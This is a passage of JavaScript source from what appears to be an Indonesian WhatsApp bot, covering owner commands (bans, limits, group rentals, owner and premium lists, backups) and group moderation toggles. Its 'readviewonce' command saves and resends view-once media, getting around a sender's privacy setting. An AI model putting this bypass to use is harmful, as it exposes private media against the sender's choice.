    // ambil angka (nomor) lalu tambahkan domain wa
    const number = text.replace(/[^0-9]/g, '');
    targetJid = number ? (number + '@s.whatsapp.net') : null;
  }

  if (!targetJid) return reply('Mohon tag/quote user atau kirim nomor. Contoh: .ban @user atau .ban 62812xxx');

  // jangan ban owner sendiri
  if (owner && Array.isArray(owner) && owner.includes(targetJid)) {
    return reply('Tidak bisa membanned owner.');
  }

  // jangan ban bot sendiri
  if (targetJid === botNumber) {
    return reply('Tidak bisa membanned bot.');
  }

  // cek sudah dibanned
  if (isBannedUser(targetJid)) {
    return reply('User tersebut sudah dibanned sebelumnya.');
  }

  const ok = addBannedUser(targetJid);
  if (ok) {
    reply(`Sukses membanned:\n${targetJid}\nJika ingin membuka ban: .unban @user`);
    // opsional: log ke owner / group admin
    try {
      if (sock && sock.sendMessage) {
        // contoh notifikasi ke owner
        if (owner && owner[0]) sock.sendMessage(owner[0], { text: `User dibanned: ${targetJid}\nBy: ${m.sender}` });
      }
    } catch (e) { /* ignore */ }
  } else {
    reply('Gagal menyimpan data banned. Cek permission file.');
  }
} break;

// --- optional: case "unban" untuk membuka ban ---
case 'unban': {
  if (!isOwner) return reply('Perintah ini hanya untuk owner.');

  let targetJid = null;
  if (m.mentionedJid && m.mentionedJid.length) {
    targetJid = m.mentionedJid[0];
  } else if (m.quoted && m.quoted.sender) {
    targetJid = m.quoted.sender;
  } else if (text && text.match(/\d{6,}/)) {
    const number = text.replace(/[^0-9]/g, '');
    targetJid = number ? (number + '@s.whatsapp.net') : null;
  }

  if (!targetJid) return reply('Mohon tag/quote user atau kirim nomor. Contoh: .unban @user atau .unban 62812xxx');

  if (!isBannedUser(targetJid)) {
    return reply('User tersebut tidak terdapat di daftar banned.');
  }

  const ok = removeBannedUser(targetJid);
  if (ok) {
    reply(`Sukses membuka ban: ${targetJid}`);
  } else {
    reply('Gagal menghapus dari daftar banned. Cek permission file.');
  }
} break;
case 'addlimit': {
  // Cek apakah pengguna adalah owner/admin
  if (!isOwner) {
    return reply('âŒ *PERINTAH KHUSUS OWNER*\nHanya owner yang dapat menambah limit user!')
  }
  
  // Parse argument: .addlimit @user jumlah | .addlimit 628xxx jumlah
  let [target, amount] = text.split(' ')
  
  if (!target || !amount) {
    return reply(`âŒ *FORMAT SALAH!*
    
ğŸ“ *Cara penggunaan:*
â€¢ .addlimit @user jumlah
â€¢ .addlimit 628xxx jumlah

ğŸ“Œ *Contoh:*
â€¢ .addlimit @user 50
â€¢ .addlimit 6281234567890 25`)
  }
  
  // Parse jumlah limit
  amount = parseInt(amount)
  if (isNaN(amount) || amount <= 0) {
    return reply('âŒ Jumlah limit harus angka positif!')
  }
  
  // Cari target user
  let userTarget
  if (target.startsWith('@')) {
    // Jika mention @user
    const mentioned = m.mentionedJid[0]
    if (!mentioned) {
      return reply('âŒ Tag user yang valid!')
    }
    userTarget = mentioned
  } else if (target.startsWith('628')) {
    // Jika input nomor langsung
    userTarget = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  } else {
    return reply('âŒ Format target tidak valid! Gunakan @user atau nomor 628xxx')
  }
  
  // Pastikan user ada di database
  if (!global.db.users[userTarget]) {
    global.db.users[userTarget] = {
      limit: 0,
      freelimit: 0,
      money: 0,
      // ... properti default lainnya
    }
  }
  
  const user = global.db.users[userTarget]
  
  // Tambah limit
  user.limit = (user.limit || 0) + amount
  
  // Dapatkan info user
  const userInfo = await sock.fetchStatus(userTarget).catch(() => ({ status: 'Unknown' }))
  const userName = user.nama || user.name || 'User'
  
  reply(`âœ… *BERHASIL MENAMBAH LIMIT*

ğŸ‘¤ *User:* ${userName}
ğŸ“ *Nomor:* ${userTarget.split('@')[0]}
â• *Limit ditambah:* ${amount}
ğŸ“Š *Limit sekarang:* ${user.limit}

âš¡ *Ditambahkan oleh:* ${pushname}`)
}
break

case "addsewa": {
  if (!isOwner) return reply("Owner only")

  let [link, waktu] = text.split("|").map(v => v.trim())
  if (!link || !waktu) return reply("Format:\n.addsewa linkgrup | 30d")

  let duration = parseDuration(waktu)
  if (!duration) return reply("Durasi tidak valid")

  let code = link.split("https://chat.whatsapp.com/")[1]
  let res = await sock.groupAcceptInvite(code)

  let sewa = loadSewa()
  sewa[res] = {
    link,
    expired: Date.now() + duration
  }

  saveSewa(sewa)

  reply(`âœ… Berhasil join grup\nâ³ Expired: ${waktu}`)
}
break
case "delsewa": {
  if (!isOwner) return reply("Owner only")
  if (!text) return reply("Masukkan link grup")

  let code = text.split("https://chat.whatsapp.com/")[1]
  let jid = await sock.groupAcceptInvite(code)

  let sewa = loadSewa()
  if (!sewa[jid]) return reply("Grup tidak ada di database")

  delete sewa[jid]
  saveSewa(sewa)

  await sock.groupLeave(jid)
  reply("âŒ Sewa dihapus & bot keluar grup")
}
break
case "listsewa": {
  let sewa = loadSewa()
  let teks = "ğŸ“‹ LIST SEWA BOT\n\n"

  for (let id in sewa) {
    let sisa = sewa[id].expired - Date.now()
    teks += `â€¢ ${id}\nâ³ ${Math.floor(sisa / 86400000)} hari\n\n`
  }

  reply(teks || "Tidak ada sewa aktif")
}
break
case 'sendchat': {

if (!isOwner) return reply(mess.owner)
  if (!text) return reply(`Contoh: ${cmd} Hai | id |https://`)
  let [l, r, p] = text.split`|`
if (!l) l = ''
if (!r) r = ''
if (!p) p = ''
  let teks = `${l}`

  // ID Owner Bot (bisa lebih dari satu)
  const ownerJid = [`${r}`] // ganti dengan nomor owner

  for (let id of ownerJid) {
    await sock.sendMessage(id, {
    interactiveMessage: {
      title: teks,
      footer: namaBot,
      thumbnail: thumbnail,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: namaBot,
            url: "t.me/zion209",
            copy_code: `Uptime : ${runtime(process.uptime())}`,
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: namaBot,
            button_title: namaBot
          },
          tap_target_configuration: {
            title: "â–¸ X â—‚",
            description: "bomboclard",
            canonical_url: "https://t.me/sh3nnmine",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
      {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: "source",
          url: p,
          merchant_url: p
})
          }
        ]
      }
    }
  },
  { quoted: fakeQuoted });
  }


  reply('Berhasil mengirim pesan')
}
break
case 'join':
    case 'joingc': {

if (!isOwner) return reply(mess.owner);
      if (!text) return reply(`Contoh: ${cmd} linkgc`)
      sock.sendMessage(m.chat, {
        text: 'Sukses join ke grup.'
      }, {
        quoted: fakeQuoted
      })
      const groupId = await extractGroupId(text);
    if (!groupId) return reply("Link group tidak valid!");
      await sock.groupAcceptInvite(groupId);
    }
    break
case "addowner":
case "addown": {

    if (!isOwner) return reply(mess.owner)
    if (!m.quoted && !text) return reply("Contoh: .addowner 6285xxxx")

    // AMBIL RAW NUMBER
    let raw = m.quoted 
        ? m.quoted.sender.split("@")[0] 
        : text

    // BERSIHKAN SEMUA NON-DIGIT
    let number = raw.replace(/\D/g, "")  // hanya angka

    // KHUSUS NOMOR INDONESIA
    if (number.startsWith("0")) {
        number = "62" + number.slice(1)
    }

    // Jika nomor lain (misal Austria +43), biarkan apa adanya
    // contoh: "43xxxxxx"

    // CEK VALID
    if (number.length < 6) return reply("Nomor tidak valid!")

    const jid = number + "@s.whatsapp.net"

    // CEK OWNER SUDAH ADA
    if (owner.includes(jid)) return reply(`Nomor ${number} sudah menjadi owner!`)
    if (jid === botNumber) return reply(`Tidak bisa menambahkan bot sebagai owner!`)

    // SIMPAN
    owner.push(jid)
    fs.writeFileSync("./database/owner.json", JSON.stringify(owner, null, 2))

    reply(`Owner berhasil ditambah: ${number} âœ…`)
}
break
case "listowner": case "listown": {

if (owner.length < 1) return reply("Tidak ada owner tambahan")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owner) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
sock.sendMessage(m.chat, {text: teks, mentions: owner}, {quoted: fakeQuoted})
}
break
case "delowner": case "delown": {

if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return reply(`Tidak bisa menghapus owner utama!`)
if (!owner.includes(input)) return reply(`Nomor ${input2} bukan owner bot!`)
let posi = owner.indexOf(input)
await owner.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner, null, 2))
reply(`Berhasil menghapus owner âœ…`)
}
break
case 'delppbot': {

if (!isOwner) return reply(mess.owner)
await sock.removeProfilePicture(sock.user.id)
reply(`Berhasil Menghapus Gambar Profil Bot`)
}
break
case 'setbotpp':
    case 'setppbot': {

if (!isOwner) return relply(mess.owner)
      if (!quoted) return reply(`Kirim/kutip gambar dengan caption ${cmd}`)
      if (!/image/.test(mime)) return reply(`Kirim/kutip gambar dengan caption ${cmd}`)
      if (/webp/.test(mime)) return reply(`Kirim/kutip gambar dengan caption ${cmd}`)
      let media = await sock.downloadAndSaveMediaMessage(quoted)
      await sock.updateProfilePicture(botNumber, {
        url: media
      }).then(() => fs.unlinkSync(media)).catch((err) => fs.unlinkSync(media))
      reply('Sukses mengganti pp bot!')
    }
    break
case "tojs": case "q": {

if (!isOwner) return reply(mess.owner)
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
reply(jsonData)
} 
break 
case "rvo": case "readviewonce": {
 if (!isOwner) return reply(mess.owner);
if (!m.quoted) return reply("reply pesan viewOnce nya!")
let msg = m?.quoted?.message?.imageMessage || m?.quoted?.message?.videoMessage || m?.quoted?.message?.audioMessage || m?.quoted
if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce) return reply("Pesan itu bukan viewonce!")
const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
let media = await downloadContentFromMessage(msg, msg.mimetype == 'image/jpeg' ? 'image' : msg.mimetype == 'video/mp4' ? 'video' : 'audio')
    let type = msg.mimetype
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return sock.sendMessage(m.chat, {video: buffer, caption: msg.caption || ""}, {quoted: fakeQuoted})
    } else if (/image/.test(type)) {
        return sock.sendMessage(m.chat, {image: buffer, caption: msg.caption || ""}, {quoted: fakeQuoted})
    } else if (/audio/.test(type)) {
        return sock.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: fakeQuoted})
    } 
}
break
case "listprem": {

if (!isOwner) return reply(mess.owner)
if (premium.length < 1) return reply("ğ˜•ğ˜° ğ˜ğ˜¢ğ˜·ğ˜¦ ğ˜œğ˜´ğ˜¦ğ˜³ ğ˜—ğ˜³ğ˜¦ğ˜®ğ˜ªğ˜¶ğ˜® :(")
let teks = `\nğ˜“ğ˜ªğ˜´ğ˜µ ğ˜ˆğ˜­ğ˜­ ğ˜—ğ˜³ğ˜¦ğ˜®ğ˜ªğ˜¶ğ˜® ğ˜œğ˜´ğ˜¦ğ˜³\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
sock.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: fakeQuoted})
}
break
case "addprem": {

if (!isOwner) return reply(mess.owner)
if (!text && !m.quoted) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return reply(`ğ˜•ğ˜°ğ˜®ğ˜°ğ˜³ ${input2} ğ˜´ğ˜¶ğ˜¥ğ˜¢ğ˜© ğ˜”ğ˜¦ğ˜¯ğ˜«ğ˜¢ğ˜¥ğ˜ª ğ˜—ğ˜³ğ˜¦ğ˜®ğ˜ªğ˜¶ğ˜®!`)
premium.push(input)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
const user = global.db.users[input]
user.limit = (user.limit || 0) + 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
}
break
case "delprem": {
    if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return reply(`Delete success`)
if (!premium.includes(input)) return reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
reply(`ğ˜šğ˜¶ğ˜¤ğ˜¤ğ˜¦ğ˜´ğ˜´ ğ˜›ğ˜° ğ˜‹ğ˜¦ğ˜­ğ˜¦ğ˜µğ˜¦ ğ˜—ğ˜³ğ˜¦ğ˜®ğ˜ªğ˜¶ğ˜®`)
const cukupLimit = await useLimit(input, 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999);
}
break
case "self": case "public": {
   if (!isOwner) return reply(mess.owner)
   let status = true
   if (command == "self") status = false
   sock.public = status
   fs.writeFileSync("./database/setdb.json", JSON.stringify({ public: status }, null, 2))
   return reply(`Berhasil mengganti ke mode *${command}*`)
}
break
case "rst": case "restart": {

if (!isOwner) return reply(mess.owner)
function restartServer() {
const newProcess = spawn(process.argv[0], process.argv.slice(1), {
    detached: true,
    stdio: "inherit",
  });
  process.exit(0);
}
await reply("*Restarting*")
await setTimeout(() => {
restartServer();
}, 4500)
}
break
case "mode": {
   reply(`ğŸ¤– Bot Mode: ${sock.public ? "Public" : "Self"}`)
}
break
case "setnamabot":
            case "setbotname":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!text) {
 return reply(`Dimana namanya?\nContoh: ${cmd} Vynaa`);
 }
 await sock.updateProfileName(text);
 reply(`Success in changing the name of bot's number`);
 }
 break;
 case "setbiobot":
 case "setbotbio":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!text) {
 return reply(`Dimana teksnya?\nContoh: ${cmd} Vynaa`);
 }
 await sock.updateProfileStatus(text);
 reply(`Success in changing the bio of bot's number`);
 }
 break;

case "creategc":
 case "creategroup":
 {
 if (!isOwner) {
 return reply(mess.owner);
 }
 if (!args.join(" ")) {
 return reply(`Use ${cmd} groupname`);
 }
 try {
 let cret = await sock.groupCreate(args.join(" "), []);
 let response = await sock.groupInviteCode(cret.id);
 teks = ` ã€Œ Create Group ã€

â–¸ Name : ${cret.subject}
â–¸ Owner : @${cret.owner.split("@")[0]}
â–¸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
 `;
 sock.sendMessage(m.chat, {
 text: teks,
 mentions: await sock.parseMention(teks)
 }, {
 quoted: fakeQuoted
 });
 } catch {
 reply("yah Error kak laporankan ke owner agar di perbaiki");
 }
 }
 break;
 case "getcase": { 
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply("namaCase")
        let hasil = Case.get(text);
        reply(hasil)
}
break;

case "addcase": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply(`case "namacase":{ ... }`)
    try {
        Case.add(text);
        reply("âœ… Case berhasil ditambahkan.");
    } catch (e) {
        reply(e.message);
    }
}
break;

case "delcase": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply("namaCase")
    try {
        Case.delete(text);
        reply(`âœ… Case "${text}" berhasil dihapus.`);
    } catch (e) {
        reply(e.message);
    }
}
break;

case "listcase": {
    if (!isOwner) return reply(mess.owner);
    try {
        reply("ğŸ“œ List Case:\n\n" + Case.list());
    } catch (e) {
        reply(e.message);
    }
}
break;
case 'autolimit': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autolimit) return reply('Sudah diaktifkan sebelumnya')
        setting.autolimit = true
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autolimit) return reply('Sudah dinonaktifkan sebelumnya')
        setting.autolimit = false
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break                     
case 'autodetect':
case 'antitypo':         
 case 'autocorrect': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autocorrect) return reply('Sudah diaktifkan sebelumnya')
        setting.autocorrect = true
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autocorrect) return reply('Sudah dinonaktifkan sebelumnya')
        setting.autocorrect = false
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break                                         
case 'onlypc': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.onlypm) return reply('Sudah diaktifkan sebelumnya')
        setting.onlypm = true
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.onlypm) return reply('Sudah dinonaktifkan sebelumnya')
        setting.onlypm = false
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break                                    
case 'onlygc': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.onlygc) return reply('Sudah diaktifkan sebelumnya')
        setting.onlygc = true
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.onlygc) return reply('Sudah dinonaktifkan sebelumnya')
        setting.onlygc = false
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break     
case 'autobio': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autobio) return reply('Sudah diaktifkan sebelumnya')
        setting.autobio = true
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autobio) return reply('Sudah dinonaktifkan sebelumnya')
        setting.autobio = false
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }

break               
case 'readchange': case 'autoread':{
if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autoread) return reply('Sudah diaktifkan sebelumnya')
        setting.autoread = true
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autoread) return reply('Sudah dinonaktifkan sebelumnya')
        setting.autoread = false
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break
    case 'autotyping': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autotyping) return reply('Sudah diaktifkan sebelumnya')
        setting.autotyping = true
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autotyping) return reply('Sudah dinonaktifkan sebelumnya')
        setting.autotyping = false
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break  
case 'sholat':
case 'shalat': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.sholat) return reply('Sudah diaktifkan sebelumnya')
        setting.sholat = true
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.sholat) return reply('Sudah dinonaktifkan sebelumnya')
        setting.sholat = false
        fs.writeFileSync('./database/setdb.json', JSON.stringify(setting, null, 2))
        await reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break  
case "backupsc":
case "bck":
case "backup": { 
    if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber)
        return reply(mess.owner);
    try {
        const tmpDir = "./library/database/Sampah";
        if (fs.existsSync(tmpDir)) {
            const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
            for (let file of files) {
                fs.unlinkSync(`${tmpDir}/${file}`);
            }
        }

        await reply("Processing Backup Script . .");

        const name = `${namaBot.replace(/\s+/g, "_")}_Version${version.replace(/\s+/g, "_")}`;
        const exclude = ["node_modules", "Session", "package-lock.json", "yarn.lock", ".npm", ".cache"];
        const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

        if (!filesToZip.length) return reply("Tidak ada file yang dapat di-backup.");

        console.log("Files to zip:", filesToZip);
        execSync(`zip -r ${name}.zip ${filesToZip.join(" ")}`);

        if (!fs.existsSync(`./${name}.zip`)) return reply("Gagal membuat file ZIP.");

        await sock.sendMessage(m.sender, {
            document: fs.readFileSync(`./${name}.zip`),
            fileName: `${name}.zip`,
            mimetype: "application/zip"
        }, { quoted: fakeQuoted });

        fs.unlinkSync(`./${name}.zip`);

        if (m.chat !== m.sender) reply("Script bot berhasil dikirim ke private chat.");
    } catch (err) {
        console.error("Backup Error:", err);
        reply("Terjadi kesalahan saat melakukan backup.");
    }
}
break;

/*
     GROUP
*/
case "autoreact": {
  if (!m.isGroup) return reply("Khusus grup")
  if (!isAdmins) return reply("Admin only")

  let chat = db.chats[m.chat]
  if (!chat) db.chats[m.chat] = {}

  if (args[0] === "on") {
    chat.autoreact = true
    reply("âœ… Auto React diaktifkan")
  } else if (args[0] === "off") {
    chat.autoreact = false
    reply("âŒ Auto React dimatikan")
  } else {
    reply("Contoh:\n.autoreact on / off")
  }
}
break
case "setreact": {
  if (!m.isGroup) return reply("Khusus grup")
  if (!isAdmins) return reply("Admin only")
  if (!text) return reply("Contoh:\n.setreact ğŸ˜—, ğŸ˜†, ğŸ˜—, ğŸ¥°")

  let chat = db.chats[m.chat]
  if (!chat) db.chats[m.chat] = {}

  // SPLIT BERDASARKAN KOMA
  chat.reactEmoji = text
    .split(",")
    .map(e => e.trim())
    .filter(e => e.length)

  reply(
    "âœ… Emoji auto react berhasil diatur:\n" +
    chat.reactEmoji.join(" ")
  )
}
break
case "listreact": {
  let chat = db.chats[m.chat]
  if (!chat || !chat.reactEmoji)
    return reply("Belum ada emoji")

  reply(
    `ğŸ˜„ *DAFTAR EMOJI AUTO REACT*\n\n` +
    chat.reactEmoji.join(" ")
  )
}
break
case "antipromosi": {
  if (!m.isGroup) return reply("Khusus grup")
  if (!isAdmins) return reply("Admin only")

  let chat = db.chats[m.chat]
  if (!chat) db.chats[m.chat] = {}

  if (args[0] === "on") {
    chat.antipromosi = true
    reply("âœ… Anti Promosi diaktifkan")
  } else if (args[0] === "off") {
    chat.antipromosi = false
    reply("âŒ Anti Promosi dimatikan")
  } else {
    reply("Contoh:\n.antipromosi on / off")
  }
}
break
case "antivirtex": {
  if (!m.isGroup) return reply("Khusus grup")
  if (!isAdmins) return reply("Admin only")

  let chat = db.chats[m.chat]
  if (!chat) db.chats[m.chat] = {}

  if (args[0] === "on") {
    chat.antivirtex = true
    reply("âœ… Anti Virtex diaktifkan")
  } else if (args[0] === "off") {
    chat.antivirtex = false
    reply("âŒ Anti Virtex dimatikan")
  } else {
    reply("Contoh:\n.antivirtex on / off")
  }
}
break
case 'total': {
  if (!m.isGroup) return reply('Fitur ini hanya bisa digunakan di grup')

  if (!args[0] || args[0] !== 'chat') {
    return reply('Contoh:\n.total chat')
  }

  let data = global.db.chats[m.chat]?.totalchat
  if (!data || Object.keys(data).length === 0) {
    return reply('Belum ada data chat di grup ini')
  }

  // sorting dari chat terbanyak
  let sorted = Object.entries(data)
    .sort((a, b) => b[1] - a[1])

  let teks = `ğŸ“Š *TOTAL CHAT DI GRUP*\n\n`
  let no = 1

  for (let [jid, total] of sorted) {
    let user = await sock.getName(jid)
    teks += `${no}. ${user} : ${total}\n`
    no++
  }

  reply(teks)
}
break
case 'antidelete': {
    if (!isGroup) return reply('Khusus grup')
    if (!isAdmins && !isOwner) return reply('Admin only')

    if (args[0] === 'on') {
        global.antiDelete[m.chat] = true
        return reply('âœ… Anti Delete AKTIF')
    }

    if (args[0] === 'off') {
        delete global.antiDelete[m.chat]
        return reply('âŒ Anti Delete MATI')
    }

    reply('Contoh:\n.antidelete on\n.antidelete off')
}
break
case 'warn': {
  if (!m.isGroup) return
  if (!isAdmins && !isOwner) return

  if (args[0] === 'on') {
    db.chats[m.chat].warn = true
    reply('âœ… Warn diaktifkan')
  } else if (args[0] === 'off') {
    db.chats[m.chat].warn = false
    reply('âŒ Warn dimatikan')
  } else {
    reply('Contoh:\n.warn on\n.warn off')
  }
}
break
case 'delwarn': {
  if (!m.isGroup) return
  if (!isAdmins && !isOwner) return

  let target

  // 1ï¸âƒ£ REPLY PESAN
  if (m.quoted) {
    target = m.quoted.sender
  }

  // 2ï¸âƒ£ TAG USER
  else if (m.mentionedJid && m.mentionedJid.length > 0) {
    target = m.mentionedJid[0]
  }

  // 3ï¸âƒ£ NOMOR MANUAL
  else if (args[0]) {
    let number = args[0].replace(/[^0-9]/g, '')
    if (number.startsWith('0')) number = '62' + number.slice(1)
    if (!number.startsWith('62')) return reply('Format nomor salah')
    target = number + '@s.whatsapp.net'
  }

  else {
    return reply('Reply pesan / tag / ketik nomor user')
  }

  const warnPath = path.join(__dirname, 'database', 'warn.json')
  if (!fs.existsSync(warnPath)) return reply('Belum ada data warn')

  const warnData = JSON.parse(fs.readFileSync(warnPath))

  if (!warnData[target] || warnData[target].count === 0) {
    return reply('User tidak memiliki warn')
  }

